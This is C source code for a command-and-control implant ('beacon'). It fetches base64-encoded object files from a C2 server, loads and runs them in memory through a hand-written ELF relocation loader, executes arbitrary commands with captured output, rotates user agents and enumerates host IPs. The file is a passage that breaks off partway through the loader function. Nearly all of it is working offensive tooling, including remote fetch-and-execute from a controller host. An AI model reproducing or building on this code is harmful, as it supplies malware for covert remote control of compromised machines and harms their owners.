/*
 * beacon_common.c - Shared beacon infrastructure implementation.
 *
 * This file contains the BOF loader, HTTP client, crypto wrappers,
 * output capture, and utility functions used by all beacon variants.
 * Centralizing this code eliminates duplication and ensures consistent
 * behavior across v1, v2, and v3 beacons.
 */
#define _GNU_SOURCE
#include "beacon_common.h"
#include "aes.h"
#include "cJSON.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <elf.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdarg.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <curl/curl.h>
#include <signal.h>
#include <openssl/rand.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/hmac.h>

/* --- Global state --- */
char *g_beacon_output = NULL;

/* BOFs run forked: buffer and length live in MAP_SHARED memory so the
 * parent can read whatever the child's BeaconOutput calls produced. */
typedef struct
{
    size_t len;
    size_t capacity;
} bsb_output_meta_t;

static bsb_output_meta_t *g_out_meta = NULL;

void *g_printf_ptr = NULL;
void *g_strlen_ptr = NULL;
void *g_memcpy_ptr = NULL;
void *g_memset_ptr = NULL;
void *g_exit_ptr = NULL;
void *g_dlsym_ptr = NULL;
void *g_dlerror_ptr = NULL;
void *g_dlopen_ptr = NULL;
void *g_dlclose_ptr = NULL;
void *g_write_ptr = NULL;
void *g_mmap_ptr = NULL;
void *g_munmap_ptr = NULL;
void *g_BeaconPrintf_ptr = NULL;
void *g_BeaconOutput_ptr = NULL;
void *g_socket_ptr = NULL;
void *g_connect_ptr = NULL;
void *g_inet_addr_ptr = NULL;
void *g_htons_ptr = NULL;
void *g_send_ptr = NULL;
void *g_recv_ptr = NULL;
void *g_close_ptr = NULL;
void *g_getaddrinfo_ptr = NULL;
void *g_freeaddrinfo_ptr = NULL;

static Trampoline *g_trampolines = NULL;
static size_t g_trampolines_count = 0;
static size_t g_trampolines_capacity = 0;

static TrampolineCache *g_trampoline_cache = NULL;
static size_t g_cache_count = 0;
static size_t g_cache_capacity = 0;

static SymbolResolver g_external_symbols[] = {{"printf", &g_printf_ptr},
                                              {"strlen", &g_strlen_ptr},
                                              {"memcpy", &g_memcpy_ptr},
                                              {"memset", &g_memset_ptr},
                                              {"exit", &g_exit_ptr},
                                              {"dlsym", &g_dlsym_ptr},
                                              {"dlerror", &g_dlerror_ptr},
                                              {"dlopen", &g_dlopen_ptr},
                                              {"dlclose", &g_dlclose_ptr},
                                              {"write", &g_write_ptr},
                                              {"mmap", &g_mmap_ptr},
                                              {"munmap", &g_munmap_ptr},
                                              {"BeaconPrintf", &g_BeaconPrintf_ptr},
                                              {"BeaconOutput", &g_BeaconOutput_ptr},
                                              {"socket", &g_socket_ptr},
                                              {"connect", &g_connect_ptr},
                                              {"inet_addr", &g_inet_addr_ptr},
                                              {"htons", &g_htons_ptr},
                                              {"send", &g_send_ptr},
                                              {"recv", &g_recv_ptr},
                                              {"close", &g_close_ptr},
                                              {"getaddrinfo", &g_getaddrinfo_ptr},
                                              {"freeaddrinfo", &g_freeaddrinfo_ptr},
                                              {NULL, NULL}};

/* --- Output buffer management --- */
int bsb_output_init(size_t capacity)
{
    if (capacity == 0)
        capacity = BSB_OUTPUT_BUFFER_DEFAULT;
    g_beacon_output = (char *)mmap(NULL, capacity, PROT_READ | PROT_WRITE,
                                   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_beacon_output == MAP_FAILED)
    {
        g_beacon_output = NULL;
        return -1;
    }
    g_out_meta = (bsb_output_meta_t *)mmap(NULL, sizeof(*g_out_meta), PROT_READ | PROT_WRITE,
                                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_out_meta == MAP_FAILED)
    {
        munmap(g_beacon_output, capacity);
        g_beacon_output = NULL;
        g_out_meta = NULL;
        return -1;
    }
    g_out_meta->capacity = capacity;
    g_out_meta->len = 0;
    g_beacon_output[0] = '\0';
    return 0;
}

void bsb_output_cleanup(void)
{
    if (g_beacon_output && g_out_meta)
    {
        munmap(g_beacon_output, g_out_meta->capacity);
    }
    if (g_out_meta)
    {
        munmap(g_out_meta, sizeof(*g_out_meta));
    }
    g_beacon_output = NULL;
    g_out_meta = NULL;
}

void bsb_output_reset(void)
{
    if (g_beacon_output && g_out_meta)
    {
        g_out_meta->len = 0;
        g_beacon_output[0] = '\0';
    }
}

/* --- Beacon API (called by BOFs) --- */
void BeaconPrintf(int type, const char *fmt, ...)
{
    (void)type;
    if (!g_beacon_output || !g_out_meta || g_out_meta->len >= g_out_meta->capacity - 1)
        return;
    va_list args;
    va_start(args, fmt);
    size_t remaining = g_out_meta->capacity - g_out_meta->len - 1;
    int written = vsnprintf(g_beacon_output + g_out_meta->len, remaining, fmt, args);
    va_end(args);
    if (written > 0)
    {
        g_out_meta->len += (size_t)written < remaining ? (size_t)written : remaining;
    }
}

void BeaconOutput(int type, const char *data, int len)
{
    (void)type;
    if (!g_beacon_output || !g_out_meta || len <= 0 || !data)
        return;
    size_t remaining = g_out_meta->capacity - g_out_meta->len - 1;
    if ((size_t)len > remaining)
    {
        len = (int)remaining;
    }
    memcpy(g_beacon_output + g_out_meta->len, data, len);
    g_out_meta->len += len;
    g_beacon_output[g_out_meta->len] = '\0';
}

/* --- Trampoline management --- */
/* mmap a code page near `near_hint` so PC32 relocations stay within the
 * +-2GB displacement range; falls back to an arbitrary placement. */
static void *mmap_near(void *near_hint, size_t len, int prot)
{
    static const long offs[] = {-64L * 1024 * 1024, -16L * 1024 * 1024, -4L * 1024 * 1024,
                                4L * 1024 * 1024,   16L * 1024 * 1024,  64L * 1024 * 1024};
    if (near_hint)
    {
        uintptr_t base = (uintptr_t)near_hint & ~(uintptr_t)0xFFF;
        for (size_t i = 0; i < sizeof(offs) / sizeof(offs[0]); i++)
        {
            void *p = mmap((void *)(base + offs[i]), len, prot,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (p != MAP_FAILED)
                return p;
        }
    }
    return mmap(NULL, len, prot, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void *create_trampoline(void *target, void *near_hint)
{
    if (!target)
        return NULL;
    size_t code_size = 12;
    /* W^X: map RW, write the stub, then flip to RX. Never RWX. */
    void *code = mmap_near(near_hint, code_size, PROT_READ | PROT_WRITE);
    if (code == MAP_FAILED)
        return NULL;

    uint8_t trampoline_code[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0};
    *(uint64_t *)(trampoline_code + 2) = (uint64_t)target;
    memcpy(code, trampoline_code, code_size);
    if (mprotect(code, code_size, PROT_READ | PROT_EXEC) != 0)
    {
        munmap(code, code_size);
        return NULL;
    }

    if (g_trampolines_count >= g_trampolines_capacity)
    {
        size_t new_cap = g_trampolines_capacity ? g_trampolines_capacity * 2 : 4;
        Trampoline *tmp = realloc(g_trampolines, new_cap * sizeof(Trampoline));
        if (!tmp)
        {
            munmap(code, code_size);
            return NULL;
        }
        g_trampolines = tmp;
        g_trampolines_capacity = new_cap;
    }
    g_trampolines[g_trampolines_count].addr = code;
    g_trampolines[g_trampolines_count].size = code_size;
    g_trampolines_count++;
    return code;
}

void cleanup_trampolines(void)
{
    for (size_t i = 0; i < g_trampolines_count; i++)
    {
        munmap(g_trampolines[i].addr, g_trampolines[i].size);
    }
    free(g_trampolines);
    g_trampolines = NULL;
    g_trampolines_count = 0;
    g_trampolines_capacity = 0;

    free(g_trampoline_cache);
    g_trampoline_cache = NULL;
    g_cache_count = 0;
    g_cache_capacity = 0;
}

void *get_or_create_trampoline(void *target, void *near_hint)
{
    if (!target)
        return NULL;
    for (size_t i = 0; i < g_cache_count; i++)
    {
        if (g_trampoline_cache[i].original == target)
        {
            return g_trampoline_cache[i].trampoline;
        }
    }
    void *tramp = create_trampoline(target, near_hint);
    if (!tramp)
        return NULL;

    if (g_cache_count >= g_cache_capacity)
    {
        size_t new_cap = g_cache_capacity ? g_cache_capacity * 2 : 8;
        TrampolineCache *tmp = realloc(g_trampoline_cache, new_cap * sizeof(TrampolineCache));
        if (!tmp)
            return tramp;
        g_trampoline_cache = tmp;
        g_cache_capacity = new_cap;
    }
    g_trampoline_cache[g_cache_count].original = target;
    g_trampoline_cache[g_cache_count].trampoline = tramp;
    g_cache_count++;
    return tramp;
}

/* --- HTTP client --- */
struct MemoryStruct
{
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr)
        return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

/* Convert a config fingerprint to the format libcurl's
 * CURLOPT_PINNEDPUBLICKEY expects ("sha256//<base64>").
 * Accepts 64 hex chars (the config contract) or an already
 * formatted "sha256//..." value. Anything else is passed through
 * so curl fails closed on malformed pins. */
static int bsb_hex_val(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void bsb_curl_pin_format(const char *in, char *out, size_t outsz)
{
    if (!in || !in[0] || !out || outsz == 0)
        return;

    size_t in_len = strlen(in);

    if (in_len == 64)
    {
        unsigned char raw[32];
        int hex_ok = 1;
        for (int i = 0; i < 32 && hex_ok; i++)
        {
            int hi = bsb_hex_val(in[i * 2]);
            int lo = bsb_hex_val(in[i * 2 + 1]);
            if (hi < 0 || lo < 0)
                hex_ok = 0;
            else
                raw[i] = (unsigned char)((hi << 4) | lo);
        }
        if (hex_ok)
        {
            char *b64 = base64_encode(raw, 32);
            if (b64)
            {
                snprintf(out, outsz, "sha256//%s", b64);
                free(b64);
                return;
            }
        }
    }

    /* Pass through (covers "sha256//..." and malformed values; curl
     * fails closed on pins it cannot parse). */
    snprintf(out, outsz, "%s", in);
}

http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method,
                              const char *post_data)
{
    http_response_t resp = {0};
    CURL *curl = curl_easy_init();
    if (!curl)
        return resp;

    struct MemoryStruct chunk = {0};
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT,
                     cfg->network.user_agents[rand() % cfg->network.count]);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, (long)cfg->network.verify_tls);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, (long)(cfg->network.verify_tls ? 2L : 0L));

    /* Certificate pinning (TOFU): if fingerprint is configured, pin it.
     * curl expects "sha256//<base64>"; the config stores 64 hex chars
     * (contract: network.cert_fingerprint_sha256), so convert here.
     * Passing the raw hex string makes curl always reject the peer
     * (verified empirically: pinning dead-on-arrival without this). */
    if (cfg->network.cert_fingerprint_sha256[0] != '\0')
    {
        char pin_buf[128];
        bsb_curl_pin_format(cfg->network.cert_fingerprint_sha256, pin_buf, sizeof(pin_buf));
        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);
    }

    curl_easy_setopt(curl, CURLOPT_TIMEOUT, (long)cfg->timing.curl_timeout_seconds);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, (long)cfg->timing.curl_connect_timeout_seconds);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");

    struct curl_slist *headers = NULL;
    if (strcmp(method, "POST") == 0)
    {
        size_t post_len = post_data ? strlen(post_data) : 0;
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (post_data)
        {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)post_len);
        }
        else
        {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0L);
        }
        headers = curl_slist_append(headers, "Content-Type: text/plain");
        headers = curl_slist_append(headers, "Expect:");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    }

    CURLcode res = curl_easy_perform(curl);
    if (headers)
        curl_slist_free_all(headers);

    if (res != CURLE_OK)
    {
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return resp;
    }

    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    resp.status = (int)http_code;
    resp.data = chunk.memory;
    resp.len = chunk.size;
    curl_easy_cleanup(curl);
    return resp;
}

/* --- Base64 --- */
char *base64_encode(const unsigned char *input, int len)
{
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(b64, input, len);
    BIO_flush(b64);
    BUF_MEM *bptr;
    BIO_get_mem_ptr(b64, &bptr);
    char *buf = malloc(bptr->length + 1);
    memcpy(buf, bptr->data, bptr->length);
    buf[bptr->length] = '\0';
    BIO_free_all(b64);
    return buf;
}

unsigned char *base64_decode(const char *input, int *len)
{
    int input_len = strlen(input);
    *len = 0;
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO *bmem = BIO_new_mem_buf(input, input_len);
    b64 = BIO_push(b64, bmem);
    unsigned char *buffer = malloc(input_len);
    if (!buffer)
    {
        BIO_free_all(b64);
        return NULL;
    }
    *len = BIO_read(b64, buffer, input_len);
    BIO_free_all(b64);
    if (*len <= 0)
    {
        free(buffer);
        return NULL;
    }
    return buffer;
}

/* --- Secure IV Generation --- */
/*
 * Generates a cryptographically secure 16-byte IV.
 * Tries OpenSSL RAND_bytes first, falls back to getrandom(2).
 * Returns 1 on success, 0 on failure (fail-closed).
 */
int bsb_generate_secure_iv(unsigned char *iv_out)
{
    if (!iv_out) return 0;

    /* Try OpenSSL RAND_bytes first */
    int rand_result = RAND_bytes(iv_out, 16);
    if (rand_result == 1)
    {
        return 1; /* Success */
    }

    /* Fallback to getrandom(2) with GRND_NONBLOCK */
#if defined(__linux__) && defined(SYS_getrandom)
    long ret = syscall(SYS_getrandom, iv_out, 16, GRND_NONBLOCK);
    if (ret == 16)
    {
        return 1; /* Success */
    }
#endif

    /* Both sources failed - fail closed */
    return 0;
}

/* --- URL encoding --- */
static int _is_unreserved(unsigned char c)
{
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
           c == '_' || c == '.' || c == '~';
}

char *url_encode(const char *in, size_t in_len, size_t *out_len)
{
    char *out = malloc(in_len * 3 + 1);
    if (!out)
        return NULL;
    size_t j = 0;
    for (size_t i = 0; i < in_len; i++)
    {
        unsigned char c = (unsigned char)in[i];
        if (_is_unreserved(c))
        {
            out[j++] = (char)c;
        }
        else
        {
            static const char hex[] = "0123456789ABCDEF";
            out[j++] = '%';
            out[j++] = hex[(c >> 4) & 0xF];
            out[j++] = hex[c & 0xF];
        }
    }
    out[j] = '\0';
    *out_len = j;
    return out;
}

/* --- Command execution (execve-based, no shell) --- */
/*
 * Parse command string into argv array.
 * Returns malloc'd argv array (NULL-terminated), caller must free each string and the array.
 * Returns NULL on parse error.
 */
static char **parse_cmd_to_argv(const char *cmd, int *out_argc)
{
    if (!cmd || !*cmd) return NULL;
    
    /* First pass: count arguments */
    int argc = 0;
    const char *p = cmd;
    while (*p)
    {
        while (*p && (*p == ' ' || *p == '\t')) p++;
        if (!*p) break;
        
        argc++;
        if (*p == '"' || *p == '\'')
        {
            char quote = *p++;
            while (*p && *p != quote) p++;
            if (*p == quote) p++;
        }
        else
        {
            while (*p && *p != ' ' && *p != '\t') p++;
        }
    }
    
    if (argc == 0) return NULL;
    
    char **argv = calloc(argc + 1, sizeof(char *));
    if (!argv) return NULL;
    
    /* Second pass: extract arguments */
    p = cmd;
    int i = 0;
    while (*p && i < argc)
    {
        while (*p && (*p == ' ' || *p == '\t')) p++;
        if (!*p) break;
        
        const char *start = p;
        size_t len = 0;
        
        if (*p == '"' || *p == '\'')
        {
            char quote = *p++;
            start = p;
            while (*p && *p != quote)
            {
                p++; len++;
            }
            if (*p == quote) p++;
        }
        else
        {
            while (*p && *p != ' ' && *p != '\t')
            {
                p++; len++;
            }
        }
        
        argv[i] = malloc(len + 1);
        if (!argv[i])
        {
            for (int j = 0; j < i; j++) free(argv[j]);
            free(argv);
            return NULL;
        }
        memcpy(argv[i], start, len);
        argv[i][len] = '\0';
        i++;
    }
    
    argv[argc] = NULL;
    *out_argc = argc;
    return argv;
}

static void free_argv(char **argv)
{
    if (!argv) return;
    for (int i = 0; argv[i]; i++) free(argv[i]);
    free(argv);
}

/* Execute command via execve (no shell) and capture stdout+stderr.
 * Returns malloc'd buffer with combined output (caller frees).
 * On error, returns NULL.
 */
char *exec_cmd(const char *cmd, int *out_len)
{
    if (!cmd || !out_len) return NULL;
    
    int argc = 0;
    char **argv = parse_cmd_to_argv(cmd, &argc);
    if (!argv || argc == 0)
    {
        free_argv(argv);
        return NULL;
    }
    
    /* Create pipes for stdout and stderr */
    int stdout_pipe[2], stderr_pipe[2];
    if (pipe(stdout_pipe) < 0 || pipe(stderr_pipe) < 0)
    {
        free_argv(argv);
        if (stdout_pipe[0] >= 0) { close(stdout_pipe[0]); close(stdout_pipe[1]); }
        if (stderr_pipe[0] >= 0) { close(stderr_pipe[0]); close(stderr_pipe[1]); }
        return NULL;
    }
    
    pid_t pid = fork();
    if (pid < 0)
    {
        close(stdout_pipe[0]); close(stdout_pipe[1]);
        close(stderr_pipe[0]); close(stderr_pipe[1]);
        free_argv(argv);
        return NULL;
    }
    
    if (pid == 0)
    {
        /* Child: redirect stdout/stderr to pipes, then execve */
        close(stdout_pipe[0]);
        close(stderr_pipe[0]);
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stderr_pipe[1], STDERR_FILENO);
        close(stdout_pipe[1]);
        close(stderr_pipe[1]);
        
        /* execve does not search PATH; resolve bare command names like
         * a shell would, then exec with argv (no shell interpretation). */
        if (strchr(argv[0], '/'))
        {
            execve(argv[0], argv, environ);
        }
        else
        {
            const char *path_env = getenv("PATH");
            const char *dir = path_env ? path_env : "";
            char pathbuf[4096];
            while (dir && *dir)
            {
                const char *colon = strchr(dir, ':');
                size_t dlen = colon ? (size_t)(colon - dir) : strlen(dir);
                if (dlen == 0)
                {
                    /* empty PATH element = current directory */
                    execve(argv[0], argv, environ);
                }
                else if (dlen + strlen(argv[0]) + 2 <= sizeof(pathbuf))
                {
                    memcpy(pathbuf, dir, dlen);
                    pathbuf[dlen] = '/';
                    memcpy(pathbuf + dlen + 1, argv[0], strlen(argv[0]) + 1);
                    execve(pathbuf, argv, environ);
                }
                dir = colon ? colon + 1 : NULL;
            }
        }

        /* If execve returns, it failed */
        _exit(127);
    }
    
    /* Parent: close write ends, read from pipes */
    close(stdout_pipe[1]);
    close(stderr_pipe[1]);
    
    char *buffer = malloc(BSB_OUTPUT_BUFFER_DEFAULT);
    if (!buffer)
    {
        close(stdout_pipe[0]);
        close(stderr_pipe[0]);
        free_argv(argv);
        return NULL;
    }
    
    size_t capacity = BSB_OUTPUT_BUFFER_DEFAULT;
    size_t total = 0;
    ssize_t n;
    
    /* Read stdout */
    while ((n = read(stdout_pipe[0], buffer + total, capacity - total - 1)) > 0)
    {
        total += n;
        if (total >= capacity - 1)
        {
            capacity *= 2;
            char *tmp = realloc(buffer, capacity);
            if (!tmp) break;
            buffer = tmp;
        }
    }
    
    /* Read stderr (append to output) */
    while ((n = read(stderr_pipe[0], buffer + total, capacity - total - 1)) > 0)
    {
        total += n;
        if (total >= capacity - 1)
        {
            capacity *= 2;
            char *tmp = realloc(buffer, capacity);
            if (!tmp) break;
            buffer = tmp;
        }
    }
    
    close(stdout_pipe[0]);
    close(stderr_pipe[0]);
    
    /* Wait for child */
    int status;
    waitpid(pid, &status, 0);
    
    free_argv(argv);
    
    if (total == 0)
    {
        free(buffer);
        *out_len = 0;
        return strdup("");
    }
    
    buffer[total] = '\0';
    *out_len = (int)total;
    return buffer;
}

/* --- Backoff state --- */
void bsb_backoff_init(bsb_backoff_t *bo, int base, int max)
{
    bo->current_seconds = base;
    bo->base_seconds = base;
    bo->max_seconds = max;
}

int bsb_backoff_next(bsb_backoff_t *bo)
{
    int val = bo->current_seconds;
    bo->current_seconds *= 2;
    if (bo->current_seconds > bo->max_seconds)
    {
        bo->current_seconds = bo->max_seconds;
    }
    return val;
}

void bsb_backoff_reset(bsb_backoff_t *bo)
{
    bo->current_seconds = bo->base_seconds;
}

/* --- IP discovery --- */
char *get_local_ips(void)
{
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
        return strdup("127.0.0.1");
    struct ifconf ifc;
    char buf[1024];
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sockfd, SIOCGIFCONF, &ifc) < 0)
    {
        close(sockfd);
        return strdup("127.0.0.1");
    }
    struct ifreq *ifr = ifc.ifc_req;
    int n = ifc.ifc_len / sizeof(struct ifreq);
    char *result = malloc(1024);
    result[0] = '\0';
    for (int i = 0; i < n; i++)
    {
        struct sockaddr_in *addr = (struct sockaddr_in *)&ifr[i].ifr_addr;
        if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, "lo") != 0)
        {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);
            if (strlen(result) > 0)
                strcat(result, ", ");
            strcat(result, ip);
        }
    }
    close(sockfd);
    return strlen(result) > 0 ? result : strdup("127.0.0.1");
}

/* --- BOF download --- */
unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size)
{
    *out_size = 0;
    http_response_t resp = https_request(cfg, url, "GET", NULL);
    if (!resp.data || resp.len == 0)
    {
        free(resp.data);
        return NULL;
    }
    /* The C2 serves base64(obj) + CRLF (see handle_bof in c2/server.py);
     * decode back to the raw ELF relocatable before handing it to RunELF. */
    size_t b64_len = strlen(resp.data);
    while (b64_len > 0 &&
           (resp.data[b64_len - 1] == '\r' || resp.data[b64_len - 1] == '\n'))
    {
        b64_len--;
    }
    resp.data[b64_len] = '\0';

    int decoded_len = 0;
    unsigned char *decoded = base64_decode(resp.data, &decoded_len);
    free(resp.data);
    if (!decoded || decoded_len <= 0)
    {
        free(decoded);
        return NULL;
    }
    *out_size = (size_t)decoded_len;
    return decoded;
}

/* --- BOF execution with fork isolation --- */
static void init_function_pointers(void)
{
    if (!g_BeaconPrintf_ptr)
        g_BeaconPrintf_ptr = (void *)BeaconPrintf;
    if (!g_BeaconOutput_ptr)
        g_BeaconOutput_ptr = (void *)BeaconOutput;
    if (!g_mmap_ptr)
        g_mmap_ptr = (void *)mmap;
    if (!g_munmap_ptr)
        g_munmap_ptr = (void *)munmap;
    if (!g_write_ptr)
        g_write_ptr = (void *)write;
    if (!g_printf_ptr)
        g_printf_ptr = (void *)printf;
    if (!g_memcpy_ptr)
        g_memcpy_ptr = (void *)memcpy;
    if (!g_memset_ptr)
        g_memset_ptr = (void *)memset;
    if (!g_strlen_ptr)
        g_strlen_ptr = (void *)strlen;
    if (!g_socket_ptr)
        g_socket_ptr = (void *)socket;
    if (!g_connect_ptr)
        g_connect_ptr = (void *)connect;
    if (!g_close_ptr)
        g_close_ptr = (void *)close;
    if (!g_getaddrinfo_ptr)
        g_getaddrinfo_ptr = (void *)getaddrinfo;
    if (!g_freeaddrinfo_ptr)
        g_freeaddrinfo_ptr = (void *)freeaddrinfo;
    if (!g_send_ptr)
        g_send_ptr = (void *)send;
    if (!g_recv_ptr)
        g_recv_ptr = (void *)recv;
    if (!g_htons_ptr)
        g_htons_ptr = (void *)htons;
    if (!g_inet_addr_ptr)
        g_inet_addr_ptr = (void *)inet_addr;
    if (!g_exit_ptr)
        g_exit_ptr = (void *)exit;
    if (!g_dlsym_ptr)
        g_dlsym_ptr = (void *)dlsym;
    if (!g_dlerror_ptr)
        g_dlerror_ptr = (void *)dlerror;
    if (!g_dlopen_ptr)
        g_dlopen_ptr = (void *)dlopen;
    if (!g_dlclose_ptr)
        g_dlclose_ptr = (void *)dlclose;
}

static size_t page_align(size_t size)
{
    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0)
        page_size = 4096;
    return (size + page_size - 1) & ~(page_size - 1);
}

static void bof_crash_exit(int sig)
{
    _exit(128 + sig);
}

static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char *args,
                                                        uintptr_t arglen)
{
    /* Force a 16-byte-aligned stack before the call instead of trusting
     * the compiler's frame layout: gcc -O0 may leave %rsp misaligned in
     * the function body, and the BOF prologue's `movaps` xmm spills then
     * fault (SIGSEGV inside BeaconPrintf). We save the original %rsp in
     * a scratch slot we own below the current stack pointer, align, call,
     * then restore. Callee-saved registers are restored by the BOF
     * itself (ABI); xmm clobbers are spilled by gcc around this block. */
    asm volatile("mov %%rsp, %%rax\n\t"      /* save original rsp       */
                 "and $-16, %%rsp\n\t"       /* align down to 16        */
                 "sub $16, %%rsp\n\t"        /* scratch slot below      */
                 "mov %%rax, 8(%%rsp)\n\t"   /* stash original rsp      */
                 "mov %0, %%rdi\n\t"
                 "mov %1, %%rsi\n\t"
                 "xor %%eax, %%eax\n\t"
                 "call *%2\n\t"
                 "mov 8(%%rsp), %%rax\n\t"   /* recover original rsp    */
                 "mov %%rax, %%rsp\n\t"      /* restore                 */
                 :
                 : "r"(args), "r"(arglen), "r"(func)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "xmm0", "xmm1",
                   "xmm2", "xmm3", "xmm4", "xmm5", "xmm6", "xmm7", "memory", "cc");
}

int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
           unsigned char *argumentdata, int argumentSize)
{
    init_function_pointers();
    bsb_output_reset();

    bof_func_t entry = NULL;
    if (!elf_data || filesize < sizeof(Elf64_Ehdr))
        return -1;

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf_data;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0)
        return -1;
    if (ehdr->e_machine != EM_X86_64)
        return -1;
    if (ehdr->e_shoff == 0 || ehdr->e_shnum == 0)
        return -1;

    Elf64_Shdr *shdr = (Elf64_Shdr *)(elf_data + ehdr->e_shoff);
    char *strtab = NULL;
    Elf64_Sym *symtab = NULL;

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        if (shdr[i].sh_type == SHT_SYMTAB)
        {
            symtab = (Elf64_Sym *)(elf_data + shdr[i].sh_offset);
            if (shdr[i].sh_link < ehdr->e_shnum)
            {
                strtab = (char *)(elf_data + shdr[shdr[i].sh_link].sh_offset);
            }
            break;
        }
    }
    if (!symtab || !strtab)
        return -1;

    int sym_table_count = 0;
    for (int k = 0; k < ehdr->e_shnum; k++)
    {
        if (shdr[k].sh_type == SHT_SYMTAB)
        {
            sym_table_count = shdr[k].sh_size / sizeof(Elf64_Sym);
            break;
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA)
            continue;
        Elf64_Rela *rela = (Elf64_Rela *)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);
        for (int j = 0; j < num_rela; j++)
        {
            int sym_idx = ELF64_R_SYM(rela[j].r_info);
            if (sym_idx == 0 || sym_idx >= sym_table_count)
                continue;
            Elf64_Sym *sym = &symtab[sym_idx];
            if (sym->st_shndx != SHN_UNDEF)
                continue;
            char *sym_name = strtab + sym->st_name;
            if (!sym_name || sym_name[0] == '\0')
                continue;
            void *resolved = NULL;
            for (int k = 0; g_external_symbols[k].name; k++)
            {
                if (strcmp(sym_name, g_external_symbols[k].name) == 0)
                {
                    if (*g_external_symbols[k].ptr == NULL)
                    {
                        *g_external_symbols[k].ptr = dlsym(RTLD_DEFAULT, sym_name);
                    }
                    resolved = *g_external_symbols[k].ptr;
                    break;
                }
            }
            if (!resolved)
            {
                void *auto_resolved = dlsym(RTLD_DEFAULT, sym_name);
                if (auto_resolved)
                    resolved = auto_resolved;
            }
        }
    }

    void **sections = calloc(ehdr->e_shnum, sizeof(void *));
    size_t *aligned_sizes = calloc(ehdr->e_shnum, sizeof(size_t));
    if (!sections || !aligned_sizes)
    {
        free(sections);
        free(aligned_sizes);
        return -1;
    }

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        Elf64_Shdr *sh = &shdr[i];
        if ((sh->sh_flags & SHF_ALLOC) && sh->sh_size > 0)
        {
            if (sh->sh_type == SHT_PROGBITS)
            {
                if (sh->sh_offset + sh->sh_size > filesize)
                    continue;
            }
            size_t aligned_size = page_align(sh->sh_size);
            void *addr = mmap(NULL, aligned_size, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (addr == MAP_FAILED)
                continue;
            sections[i] = addr;
            aligned_sizes[i] = aligned_size;
            if (sh->sh_type == SHT_PROGBITS)
            {
